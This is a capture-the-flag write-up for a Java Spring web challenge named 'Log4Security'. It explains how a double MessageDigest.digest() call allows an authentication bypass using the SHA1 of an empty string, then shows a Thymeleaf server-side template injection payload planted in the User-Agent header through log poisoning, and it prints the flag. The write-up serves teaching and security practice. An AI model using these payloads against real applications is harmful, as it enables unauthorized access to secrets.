# Log4Security - Solution

**Author**: zeyu2001

**Category**: Web

## Step 1 - Enable Logging Through API

In `/api/preferences`, the request body is deserialized into a `UserPreferences` object.

```java
@PostMapping("/api/preferences")
@ResponseBody
public String preferences(@RequestBody UserPreferences preferences) {
    try {
        userPreferences.setName(preferences.getName());
        userPreferences.setLocation(preferences.getLocation());
        userPreferences.setLogging(preferences.getLogging());
        return "OK";
    } catch (Exception e) {
        return "ERROR";
    }
}
```

We can see that the `name`, `location`, and `logging` attributes are modified.

```java
@Component
@Scope(value = "session", proxyMode = ScopedProxyMode.TARGET_CLASS)
public class UserPreferences {
    private String name = "User";
    private String location = "World";
    private Boolean logging = false;
    private Logger logger = null;
    private final String uuid = UUID.randomUUID().toString();

    ...

    public void setLogging(Boolean logging) {
        this.logging = logging;
        if (this.logging == true) {
            this.resetLogger();
        }
        else {
            this.logger = null;
        }
    }
}
```

The following request will enable logging for our user.

```http
POST /api/preferences HTTP/1.1

...

{
    "name":"User",
    "location":"World",
    "logging":true
}
```

## Step 2 - Authentication

In order to view our account logs, we need to supply a `token`.

This must then match the SHA1 hash of the `SUPER_SECRET` environment variable.

```java
@PostMapping("/logs")
public String logs(@RequestParam("token") String token, Model model) {

    MessageDigest digestStorage;
    try {
        digestStorage = MessageDigest.getInstance("SHA-1");
        digestStorage.update(System.getenv("SUPER_SECRET").getBytes("ascii"));
    }
    catch (Exception e) {
        model.addAttribute("logs", "Error getting secret token, please contact CTF admins.");
        return "logs";
    }

    if (userPreferences.getLogging()) {
        userPreferences.getLogger().info("Logging in with token " + token);

        // Log login attempt
        String correctToken = new String(Hex.encodeHex(digestStorage.digest()));
        userPreferences.getLogger().info("Login attempt with token " + token + "=" + correctToken);
    }

    // Invalid token
    if (!token.equals(new String(Hex.encodeHex(digestStorage.digest())))) {
        model.addAttribute("logs", "Invalid token");
        return "logs";
    }
```

But notice that the above logic is a bit strange. If logging is enabled, then `digestStorage.digest()` is called twice. From the [documentation](https://cr.openjdk.java.net/~iris/se/11/latestSpec/api/java.base/java/security/MessageDigest.html), we can clearly see that:

```text
The digest method can be called once for a given number of updates. After digest has been called, the MessageDigest object is reset to its initialized state.
```

Therefore, the second time that `digest()` is called, it is calculating the SHA1 of an empty string.

```
$ echo -n "" | sha1
da39a3ee5e6b4b0d3255bfef95601890afd80709
```

This hash allows us to authenticate successfully and view our logs.

## Step 3 - Log Poisoning and SSTI

First of all, notice that the `User-Agent` request header is logged for every request to `/home`.

```java
@GetMapping("/home")
public String home(@RequestHeader("User-Agent") String userAgent, Model model) {
    if (userPreferences.getLogging()) {
        userPreferences.getLogger().info("Visited by " + userAgent);
    }
    model.addAttribute("name", userPreferences.getName());
    model.addAttribute("location", userPreferences.getLocation());
    return "home";
}
```

Next, notice that the Thymeleaf template uses [expression preprocessing](https://www.thymeleaf.org/doc/articles/standarddialect5minutes.html) - i.e. the `logs` variable is expanded and included as part of the outer expression.

```html
<h1>Account Logs</h1>
<p>Back to <a href="/home">home</a>.</p>
<p th:each="line : ${#strings.arraySplit('__${logs}__', T(org.apache.commons.lang3.StringUtils).LF)}">
    <span th:text="${line}"></span>
</p>
```

Therefore, poisoning our logs with `' + @environment.getProperty('FLAG') + '` would yield:

```java
${#strings.arraySplit('...' + @environment.getProperty('FLAG') + '...', T(org.apache.commons.lang3.StringUtils).LF)}
```

By poisoning the logs using the following,

```http
GET /home HTTP/1.1

...

User-Agent: ' + @environment.getProperty('FLAG') + '

...
```

We would see this in `/logs`.

```html
<p>
    <span>INFO: Visited by SEE{my_f1r57_j4v4_4ppl1c4710n_cd6840f49d28ae36fde53fed813fa2e1d3ba5783}</span>
</p>
```